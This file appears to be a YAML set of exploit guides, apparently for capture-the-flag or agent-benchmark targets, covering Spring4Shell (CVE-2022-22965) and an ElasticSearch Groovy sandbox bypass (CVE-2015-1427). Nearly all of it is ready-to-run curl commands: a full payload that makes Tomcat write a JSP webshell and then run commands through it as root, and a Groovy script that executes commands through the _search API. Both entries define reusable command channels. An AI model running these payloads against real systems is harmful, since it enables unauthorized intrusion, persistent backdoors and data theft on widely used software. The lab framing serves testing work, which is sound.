targets.exploit_guide:
version: 2
cve_id: CVE-2022-22965
summary: Exploits Spring4Shell to modify Tomcat's AccessLogValve to write a JSP webshell,
  achieving root-level remote code execution and reading the flag.
target:
  protocol: http
  port: 8080
  service_role: web_application
  endpoints: []
preconditions:
  attack_vector: network
  privileges_required: none
  required_service: {}
steps:
- id: step-1
  action: Inject JSP webshell via Spring4Shell payload
  procedure: Send a crafted HTTP GET request with Spring4Shell class loader manipulation
    parameters to modify Tomcat's AccessLogValve pattern, suffix, directory, and prefix
    to write a JSP webshell.
  command_hint: 'curl -s -o /dev/null -w "%{http_code}" ''http://{{target_ip}}:{{target_port}}/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=''
    -H ''suffix: %>//'' -H ''c1: Runtime'' -H ''c2: <%'' -H ''DNT: 1'''
  depends_on: []
  success_signal: HTTP 200 response code returned
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
- id: step-2
  action: Trigger logging to write the JSP webshell
  procedure: Send a simple HTTP GET request to the root endpoint to trigger Tomcat's
    AccessLogValve, which writes the injected JSP webshell to the webapps/ROOT directory.
  command_hint: curl -s -o /dev/null -w "%{http_code}" http://{{target_ip}}:{{target_port}}/
  depends_on:
  - step-1
  success_signal: HTTP 200 response code returned
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
- id: step-3
  action: Verify RCE via webshell
  procedure: Execute the 'id' command through the newly created JSP webshell to verify
    remote code execution.
  command_hint: curl -s "http://{{target_ip}}:{{target_port}}/tomcatwar.jsp?pwd=j&cmd=id"
  depends_on:
  - step-2
  success_signal: Output contains 'uid=0(root) gid=0(root) groups=0(root)'
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
- id: step-4
  action: Read the flag file
  procedure: Execute 'cat /flag' through the JSP webshell and strip null bytes to
    retrieve the flag.
  command_hint: curl -s "http://{{target_ip}}:{{target_port}}/tomcatwar.jsp?pwd=j&cmd=cat%20/flag"
    | tr -d '\0'
  depends_on:
  - step-3
  success_signal: Output contains the flag string
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
post_exploit:
  principal: root
  capabilities:
  - execute_command
  - read_file
  - write_file
  command_channel:
    type: webshell
    established_by:
    - step-2
    invocation_hint: curl -s "http://{{target_ip}}:{{target_port}}/tomcatwar.jsp?pwd=j&cmd=<CMD>"
      | tr -d '\0'
    reusable: true
requirements:
  tools:
  - curl
  materials: []
  authentication: none
  callback: none
evidence_refs:
- verification.native_verification.evidence

version: 2
cve_id: CVE-2015-1427
summary: Exploits an ElasticSearch Groovy sandbox bypass to execute arbitrary commands
  and read the flag file via the _search API.
target:
  protocol: http
  port: 9200
  service_role: web_application
  endpoints: []
preconditions:
  attack_vector: network
  privileges_required: none
  required_service:
    protocol: http
    port: 9200
steps:
- id: step-1
  action: Create dummy document
  procedure: Create a dummy document in ElasticSearch to ensure the _search API returns
    at least one hit for the script_fields payload.
  command_hint: 'curl -s -X POST ''http://{{target_ip}}:{{target_port}}/website/blog/''
    -H ''Content-Type: application/json'' -d ''{"name": "test"}'''
  depends_on: []
  success_signal: JSON response containing "created":true
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
- id: step-2
  action: Execute RCE to read flag
  procedure: Send a POST request to the _search API with a Groovy script that bypasses
    the sandbox and executes 'cat /flag' to read the flag.
  command_hint: 'curl -s -X POST ''http://{{target_ip}}:{{target_port}}/_search?pretty''
    -H ''Content-Type: application/text'' -d ''{"size":1, "script_fields": {"lupin":{"lang":"groovy","script":
    "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /flag\").getText()"}}}'''
  depends_on:
  - step-1
  success_signal: JSON response containing the flag value in the fields output
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
post_exploit:
  principal: root
  capabilities:
  - execute_command
  - read_file
  command_channel:
    type: http_api_rce
    established_by:
    - step-2
    invocation_hint: 'curl -s -X POST ''http://{{target_ip}}:{{target_port}}/_search?pretty''
      -H ''Content-Type: application/text'' -d ''{"size":1, "script_fields": {"lupin":{"lang":"groovy","script":
      "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"<CMD>\").getText()"}}}'''
    reusable: true
requirements:
  tools:
  - curl
  materials: []
  authentication: none
  callback: none
evidence_refs:
- verification.native_verification.evidence
